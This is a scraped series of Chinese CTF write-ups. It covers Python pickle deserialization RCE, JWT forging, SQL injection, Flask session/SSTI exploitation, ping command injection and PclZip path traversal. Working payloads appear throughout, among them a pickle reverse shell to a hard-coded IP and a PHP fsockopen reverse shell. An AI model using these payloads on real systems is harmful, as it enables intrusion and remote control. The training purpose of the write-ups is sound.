2)f=open(&#x27;p.txt&#x27;,&#x27;wb&#x27;)pickle.dump(aa,f,0)f.close()得到数据如下：ccopy_reg_reconstructorp0(c__main__Personp1c__builtin__objectp2Ntp3Rp4(dp5Vnamep6VJGoodp7sVagep8I2sb.# 这里需要注意，会有大量的\\n换行符 dumps该函数与dump的差别在于该函数不会将对象写入文件当中，只会将其转化为bytes对象，例子： 1234567891011121314151617import pickleclass Person: def __init__(self, n, a): self.name = n self.age = a def show(self): print(self.name + &quot;_&quot; + str(self.age))aa = Person(&quot;JGood&quot;, 2)# f=open(&#x27;p.txt&#x27;,&#x27;wb&#x27;)c = pickle.dumps(aa,0)print(c) 1b&#x27;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nPerson\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nVJGood\\np7\\nsVage\\np8\\nI2\\nsb.&#x27; loadload与dump对应，读取某个文件并将其还原为一个类： 12pickle.load（file，*，fix_imports &#x3D; True，encoding &#x3D;“ASCII”，errors &#x3D;“strict” ）从打开的文件对象 文件中读取pickle对象表示，并返回其中指定的重构对象层次结构。这相当于Unpickler(file).load()。 loadsloads与dumps对应，将一个序列化对象换成一个类。 在大部分的比赛当中，我们遇见的情况都是题目会load对象，所以我们要找的就是魔法函数。反序列化漏洞出现在 __reduce__()魔法函数上，这一点和PHP中的__wakeup() 魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。 而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞. 【上述摘自师傅的博客https://blog.csdn.net/qq_43431158/article/details/108919605 并且loads会自动的解决import问题，对于没有引入的module会自动尝试import，也就是说Python中标准库的代码执行，命令执行函数我们都可以使用，这里记录一下可以尝试使用的： 123456789101112131415161718192021eval, execfile, compile, open, file, map, input,os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,os.listdir, os.access,os.execl, os.execle, os.execlp, os.execlpe, os.execv,os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,pickle.load, pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.open,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.open,posixfile.fileopen,platform.popen 当 __reduce__() 函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。 例子如下： 123456789101112def __reduce__(self): print(&quot;wdnmd&quot;) return eval, (&quot;print(123213)&quot;,)person = Person()a = pickle.dumps(person,0)&#x27;&#x27;&#x27;wdnmdccb&#x27;c__builtin__\\neval\\np0\\n(Vprint(123213)\\np1\\ntp2\\nRp3\\n.&#x27;&#x27;&#x27;&#x27; 在反序列化过程结束的时候 , Python 进程会自动调用 __reduce__() 魔术方法 . 如果可以控制被调用函数的参数 , Python 进程就可以执行恶意代码。 但是在我自己试的时候，发现即使是dumps也会执行我们的语句 回到loads来说，loads也可以用于执行系统命令，除了ikun那道题目大部分payload使用eval以外，我们还可以使用 Python2中包含的commands.getoutput(),在Ikun这道题当中： 可惜这里只是Python2环境，如果在Python3环境当中，我们可以利用subprocess (1) call执行命令，返回状态码(命令正常执行返回0，报错则返回1) 12345678ret1&#x3D;subprocess.call(&quot;ifconfig&quot;)ret2&#x3D;subprocess.call(&quot;ipconfig&quot;) #python3.5不是这样，依然会抛出异常导致无法对ret2赋值print(ret1) #0print(ret2) #1ret &#x3D; subprocess.call([&quot;ls&quot;, &quot;-l&quot;], shell&#x3D;False) #shell为False的时候命令必须分开写ret &#x3D; subprocess.call(&quot;ls -l&quot;, shell&#x3D;True) (2) check_call执行命令，如果执行成功则返回状态码0，否则抛异常 12subprocess.check_call([&quot;ls&quot;, &quot;-l&quot;])subprocess.check_call(&quot;exit 1&quot;, shell&#x3D;True) (3) check_output执行命令，如果执行成功则返回执行结果，否则抛异常 12subprocess.check_output([&quot;echo&quot;, &quot;Hello World!&quot;])subprocess.check_output(&quot;exit 1&quot;, shell&#x3D;True) (4) subprocess.Popen(…)payload1234567891011import pickleimport base64import commandsclass payload(object): def __reduce__(self): return (commands.getstatusoutput, (&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;,))a = pickle.dumps(payload())a = base64.b64encode(a)print a","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"ikun","slug":"ikun","date":"2020-12-06T11:40:55.000Z","updated":"2020-12-06T13:50:06.117Z","comments":true,"path":"2020/12/06/ikun/","link":"","permalink":"http://example.com/2020/12/06/ikun/","excerpt":"","text":"考点 Python逻辑漏洞 JWT伪造 过程第一步，我们爆破找到LV6账号： 123456789import requestsfor i in range(1,999): url = &quot;http://25bf3014-fd74-4f4e-882b-5b310346732e.node3.buuoj.cn/shop?page=&#123;&#125;&quot;.format(i) res = requests.get(url) if &quot;lv6.png&quot; in res.text: print(i) break 购买的时候多点几下触发打折，然后我们手动把折扣改的特别低 得到url： 1b1g_m4mber 需要我们用admin登陆，看看自己的情况，大概只能用JWT伪造了，没有密钥丢进去爆破好了： 123ysllz@kali:~/桌面/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-QSecret is &quot;1Kun&quot; 在这个url下面： 1https:&#x2F;&#x2F;jwt.io&#x2F; 编译之后得到： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 之后去个人中心的邮箱地址下面给了个hint： 1邮箱地址：hint: \\u8fd9\\u7f51\\u7ad9\\u4e0d\\u4ec5\\u53ef\\u4ee5\\u4ee5\\u8585\\u7f8a\\u6bdb\\uff0c\\u6211\\u8fd8\\u7559\\u4e86\\u4e2a\\u540e\\u95e8\\uff0c\\u5c31\\u85cf\\u5728\\u006c\\u0076\\u0036\\u91cc 得到这句话： 1这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里 1234567&lt;div class=&quot;ui text container login-wrap-inf&quot;&gt;&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;&lt;a href=&quot;/static/asd1f654e683wq/www.zip&quot; &gt;&lt;span style=&quot;visibility:hidden&quot;&gt;删库跑路前我留了好东西在这里&lt;/span&gt;&lt;/a&gt;&lt;div class=&quot;ui segments center padddd&quot;&gt;&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;&lt;div class=&quot;ui segment&quot;&gt;&lt;img src=&quot;/static/img/b.png&quot; alt=&quot;&quot;/&gt; 把源码dump下来，在Admin.py当中我们可以找到触发点 12345678910111213141516171819202122import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == &quot;admin&quot;: return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0) else: return self.render(&#x27;no_ass.html&#x27;) @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(&#x27;become&#x27;) p = pickle.loads(urllib.unquote(become)) return self.render(&#x27;form.html&#x27;, res=p, member=1) except: return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0) 找了一篇写pickle的博客： 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;bluehawksky&#x2F;article&#x2F;details&#x2F;79027055 12345678910111213import pickle# data = &#123;&#x27;foo&#x27;: [1,2,3],# &#x27;bar&#x27;: (&#x27;Hello&#x27;, &#x27;world!&#x27;),# &#x27;baz&#x27;: True&#125;# jar = open(&#x27;data.pkl&#x27;, &#x27;wb&#x27;)# pickle.dump(data, jar) # 将pickle后的数据写入jar文件# jar.close()pkl_file = open(&#x27;data.pkl&#x27;,&#x27;rb&#x27;)data = pickle.load(pkl_file)print(data)pkl_file.close() 大概过程就这样，我们就可以读取文件了，但是很明显这不是我们想要的，因为我们的需要的是一个魔术方法，当我们的文件经过源码中的 1p = pickle.loads(urllib.unquote(become)) loads过程，或者说是urlib.unquote的时候会自动触发的魔术方法才可以 在官方文档中可以找到： 12345__reduce__(self)当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 __reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 __setstate__ 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；__reduce_ex__(self)__reduce_ex__ 的存在是为了兼容性。如果它被定义，在pickle时 __reduce_ex__ 会代替 __reduce__ 被调用。 __reduce__ 也可以被定义，用于不支持 __reduce_ex__ 的旧版pickle的API调用。 在这里只能使用reduce这一魔术方法，因为仅仅有该魔术方法会告诉Python你的文件被pickle调用的时候该如何使用它… 故我们用该魔术方法生成payload 12345678910111213import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print ac__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"SWPUCTF","slug":"SWPUCTF","date":"2020-12-06T09:07:55.000Z","updated":"2020-12-06T11:29:57.734Z","comments":true,"path":"2020/12/06/SWPUCTF/","link":"","permalink":"http://example.com/2020/12/06/SWPUCTF/","excerpt":"","text":"第一步通过扫目录能够得到Index.php.bak,得出如下： 123456789GET /important_index_its_so_long_right.php?id=1 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1 在这个url下面可以进行注入 1http:&#x2F;&#x2F;182.150.46.187:8802&#x2F;important_index_its_so_long_right.php?id&#x3D;1 扫出来密码： 12345+----------------------------------+----------+------+| pwd | usn | id |+----------------------------------+----------+------+| f1097380e513e86f2c1548cc1094bf4e | admin123 | 1 |+----------------------------------+----------+------+ somd5解密可以得出：wllm@123，这个可以登陆后台，h1nt我们也可以去注入出来东西 12345+------+--------------------------------------+--------+| id | hint | user |+------+--------------------------------------+--------+| 1 | last_index_come_on_swpu_ctf.php?id=4 | 00001 |+------+--------------------------------------+--------+ 登陆后台： 源码中可以看见：writeuser_00001_log.log 123456789101112131415L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToxNi9pcDoxMjcuMC4wLjEvdmlldzp3aWZlLmh0bWw=L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToyMC9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMjozMy9pcDoxMjcuMC4wLjEvdmlldzpqaWF5b3UuaHRtbA==L3VzZXI6MDAwMDEvdGltZToxMDoyMToyNToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbmlzdHJhdG9yLmh0bWw=L3VzZXI6MDAwMDEvdGltZToxMDoyMToyOToxNi9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=L3VzZXI6MDAwMDEvdGltZToxMDoyMjoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZW8ucGhwL3VzZXI6MDAwMDEvdGltZToxMDoyMzoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==L3VzZXI6MDAwMDEvdGltZToxMDoyNDoyMzoxNC9pcDoxMjcuMC4wLjEvdmlldzplY3kucGhwL3VzZXI6MDAwMDEvdGltZToxMDoyNjoyMTozMy9pcDoxMjcuMC4wLjEvdmlldzpob21lLnBocA==L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMTo1Ni9pcDoxMjcuMC4wLjEvdmlldzppbmRleC5waHA=L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMzoxNi9pcDoxMjcuMC4wLjEvdmlldzp1cF9sb19hZF9hZF9taW4ucGhwL3VzZXI6MDAwMDEvdGltZToxMDoyODoyMjoyNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==L3VzZXI6MDAwMDEvdGltZToxMDoyODoyNToyNi9pcDoxMjcuMC4wLjEvdmlldzo0MDQuaHRtbA==L3VzZXI6MDAwMDEvdGltZToxMDoyOToxOToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbi5waHA= 全部解密出来，up_lo_ad_ad_min.php： 访问： 12非法文件类型请先去up_lo_ad_er_security.php进行登录 用user 00001去登陆，发现一个文件上传的点，结合之前的sql注入，所以我们可以用这里写shell进去获取权限 1234545948上传文件名: 1 (2).jpg文件类型: image/jpeg文件大小: 44.87109375 kB文件临时存储的位置: /tmp/phpJluzIg文件存储在: upl_oad_pat_h/1 (2).jpg 可以将shell上传到upl_oad_pat_h目录下 12345678910111213141516171819which web application language does the web server support?[1] ASP[2] ASPX[3] JSP[4] PHP (default)&gt; 4[17:30:56] [WARNING] unable to automatically retrieve the web server document rootwhat do you want to use for writable directory?[1] common location(s) (&#x27;/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs&#x27;) (default)[2] custom location(s)[3] custom directory list file[4] brute force search&gt; 2os-shell&gt; cat /flagdo you want to retrieve the command standard output? [Y/n/a] ycommand standard output: &#x27;flag&#123;d1ddddhm_swpu_e@sy_h@ck&#125;&#x27;os-shell&gt;","categories":[],"tags":[]},{"title":"N1BOOK","slug":"N1BOOK","date":"2020-12-03T06:31:16.000Z","updated":"2020-12-04T12:07:01.390Z","comments":true,"path":"2020/12/03/N1BOOK/","link":"","permalink":"http://example.com/2020/12/03/N1BOOK/","excerpt":"","text":"1-4没啥好说的arf_2利用nginx的解析错误 SQL注入2一个报错注入 1admin&#x27; and extractvalue(0x0a,concat(0x0a,(sELect group_concat(table_name) from information_schema.tables where table_schema=database() ))) # 1admin&#x27; and extractvalue(0x0a,concat(0x0a,(sELect group_concat(column_name) from information_schema.columns where table_name=&#x27;fl4g&#x27; ))) # afr_3不会了，学习了。 当我们读取文件的时候，可以通过读取proc/self/cmdline目录来查看系统执行了什么命令 123456/proc/cmdline 在启动时传递至内核的相关参数信息，这些信息通常由lilo或grub等启动管理工具进行传递； [root@rhel5 ~]# more /proc/cmdline ro root=/dev/VolGroup00/LogVol00 rhgb quiet 在这里就能看见server.py了，于是再去proc/self/cwd目录下读取这个文件 1cwd — 指向当前进程运行目录的一个符号链接； 也就是说cwd下可以连接到所有当前正在启动的进程的工作目录 于是构造： 1http:&#x2F;&#x2F;3a7463f9-513b-4f61-a0d1-b5ce36abfa59.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;server.py 得到源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import osfrom flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string )from flask_session import Sessionapp = Flask(__name__)execfile(&#x27;flag.py&#x27;)execfile(&#x27;key.py&#x27;)FLAG = flagapp.secret_key = key@app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def n1page(): if request.method != &quot;POST&quot;: return redirect(url_for(&quot;index&quot;)) n1code = request.form.get(&quot;n1code&quot;) or None if n1code is not None: n1code = n1code.replace(&quot;.&quot;, &quot;&quot;).replace(&quot;_&quot;, &quot;&quot;).replace(&quot;&#123;&quot;,&quot;&quot;).replace(&quot;&#125;&quot;,&quot;&quot;) if &quot;n1code&quot; not in session or session[&#x27;n1code&#x27;] is None: session[&#x27;n1code&#x27;] = n1code template = None if session[&#x27;n1code&#x27;] is not None: template = &#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27; % session[&#x27;n1code&#x27;] session[&#x27;n1code&#x27;] = None return render_template_string(template)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;main.html&quot;)@app.route(&#x27;/article&#x27;, methods=[&#x27;GET&#x27;])def article(): error = 0 if &#x27;name&#x27; in request.args: page = request.args.get(&#x27;name&#x27;) else: page = &#x27;article&#x27; if page.find(&#x27;flag&#x27;)&gt;=0: page = &#x27;notallowed.txt&#x27; try: template = open(&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;.format(page)).read() except Exception as e: template = e return render_template(&#x27;article.html&#x27;, template=template)if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;, debug=False) 看见flag被过滤了，读一下key.py 1Drmhze6EPcv0fN_81Bj-nA 猛测了一波 12345678910111213141516171819.eJyrVsozTM5PSVWyUqquVoiO1YuPT85JLC6Ojweycovy4-OjdQ1BosWlSWCJVKCUhma0qSVIMDMvswSsMj0nPykxB6IrqTQzpyQzD8hRUKitVaoFALt_IyQ.X8irqA.tYkx2Q2zmFaN_M5JnsennKV32nIroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpWzQwXSB9fSJ9.X8isNQ.mwsFCJ2g4ZXyuONHb9SWzKEHrVkroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpIH19In0.X8isRA._rfFegMxGGcZG8hbm0Et10WBnFIroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKSB9fSJ9.X8isYg.HxdhLvdW6lQkPiK3HHLXq7safdUroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;\\&#x27;\\&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;bash: 未预期的符号“(”附近有语法错误root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKCkgfX0ifQ.X8isow.oTg9cFIhfKJan3dvrWECrR8Y4xsroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdIH19In0.X8iswQ.4rU8qOrp7diJa_N5IjdCwm0EvLQroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;) &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykgfX0ifQ.X8is5w.TImXqmpXkV0tjZzmcVFAIvvFP28root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykucmVhZCgpIH19In0.X8is9Q._7aNNdKqdaXGJ6mbSLLA1W9wjBQroot@kali:/flask-session-cookie-manager# 最后才成功： 1python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27; [第二章 web进阶]死亡ping命令这个题目的ping能够出外网，所以我们只需要用%0a将ping换行绕过 之后curl [ip]/xxx.php &gt;&gt;/tmp/xx php可以写一个反弹shell文件，这里比如我们用P牛的： 12345678910&lt;?php$sock = fsockopen(&quot;$IP&quot;, $port);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock);$process = proc_open(&#x27;/bin/sh&#x27;, $descriptorspec, $pipes);proc_close($process); ?&gt; 之后我们再执行命令 1%0aphp /tmp/xx 即可反弹shell [第二章 web进阶]文件上传知识点：1.apache自带的文件解析漏洞如果apache读取文件的时候，后缀为其不可解析的文件名后缀，就会向上追溯，例如我们的apache解析 1aaa.php.xxx 因为apache无法解析xxx,所以apache就会解析前一个，就是aaa.php了【但是我们访问的时候依然用aaa.php.xxx去访问 2.逻辑漏洞题目是给出源代码的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126&lt;?phpheader(&quot;Content-Type:text/html; charset=utf-8&quot;);// 每5分钟会清除一次目录下上传的文件require_once(&#x27;pclzip.lib.php&#x27;);if(!$_FILES)&#123; echo &#x27;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt; &lt;title&gt;文件上传章节练习题&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; .login-box&#123; margin-top: 100px; height: 500px; border: 1px solid #000; &#125; body&#123; background: white; &#125; .btn1&#123; width: 200px; &#125; .d1&#123; display: block; height: 400px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;login-box col-md-12&quot;&gt; &lt;form class=&quot;form-horizontal&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;h1&gt;文件上传章节练习题&lt;/h1&gt; &lt;hr /&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label class=&quot;col-sm-2 control-label&quot;&gt;选择文件：&lt;/label&gt; &lt;div class=&quot;input-group col-sm-10&quot;&gt; &lt;div &gt; &lt;label for=&quot;&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;col-sm-8 text-right&quot;&gt; &lt;input type=&quot;submit&quot; class=&quot;btn btn-success text-right btn1&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&#x27;; show_source(__FILE__);&#125;else&#123; $file = $_FILES[&#x27;file&#x27;]; if(!$file)&#123; exit(&quot;请勿上传空文件&quot;); &#125; $name = $file[&#x27;name&#x27;]; $dir = &#x27;upload/&#x27;; $ext = strtolower(substr(strrchr($name, &#x27;.&#x27;), 1)); $path = $dir.$name; function check_dir($dir)&#123; $handle = opendir($dir); while(($f = readdir($handle)) !== false)&#123; if(!in_array($f, array(&#x27;.&#x27;, &#x27;..&#x27;)))&#123; if(is_dir($dir.$f))&#123; check_dir($dir.$f.&#x27;/&#x27;); &#125;else&#123; $ext = strtolower(substr(strrchr($f, &#x27;.&#x27;), 1)); if(!in_array($ext, array(&#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;)))&#123; unlink($dir.$f); &#125; &#125; &#125; &#125; &#125; if(!is_dir($dir))&#123; mkdir($dir); &#125; $temp_dir = $dir.md5(time(). rand(1000,9999)); if(!is_dir($temp_dir))&#123; mkdir($temp_dir); &#125; if(in_array($ext, array(&#x27;zip&#x27;, &#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;)))&#123; if($ext == &#x27;zip&#x27;)&#123; $archive = new PclZip($file[&#x27;tmp_name&#x27;]); foreach($archive-&gt;listContent() as $value)&#123; $filename = $value[&quot;filename&quot;]; if(preg_match(&#x27;/\\.php$/&#x27;, $filename))&#123; exit(&quot;压缩包内不允许含有php文件!&quot;); &#125; &#125; if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) &#123; check_dir($dir); exit(&quot;解压失败&quot;); &#125; check_dir($dir); exit(&#x27;上传成功!&#x27;); &#125;else&#123; move_uploaded_file($file[&#x27;tmp_name&#x27;], $temp_dir.&#x27;/&#x27;.$file[&#x27;name&#x27;]); check_dir($dir); exit(&#x27;上传成功!&#x27;); &#125; &#125;else&#123; exit(&#x27;仅允许上传zip、jpg、gif、png文件!&#x27;); &#125;&#125; 核心的点在check_dir这里，我们上下看一眼就知道我们是白名单上传，绕过就别想了，但是他允许我们上传zip，这样的话就有操作的空间了。注意这个函数： 1$archive = new PclZip($file[&#x27;tmp_name&#x27;]); 这里涉及到了一个trick，该函数是存在目录穿越漏洞的！。也就是说如果我们的文件名为../../xx.php.xx 就会被上传到其他目录，这里修改的话需要利用010editor来进行操作 之后我们可以看见： 123456foreach($archive-&gt;listContent() as $value)&#123; $filename = $value[&quot;filename&quot;]; if(preg_match(&#x27;/\\.php$/&#x27;, $filename))&#123; exit(&quot;压缩包内不允许含有php文件!&quot;); &#125; &#125; 逻辑是先解压文件，之后再check，但是利用该漏洞，check的时候文件已经被创建到其他文件夹去了，也就没办法check到了。 所以我们这里直接上传一个../../xx.php.xxx就行了 [第三章 web进阶]SSTI简单题目，直接梭就行了 1http:&#x2F;&#x2F;5d5ec153-1957-45a2-bff1-fda588f70774.node3.buuoj.cn&#x2F;?password&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat app&#x2F;server.py&#39;).read() &#125;&#125; [第三章 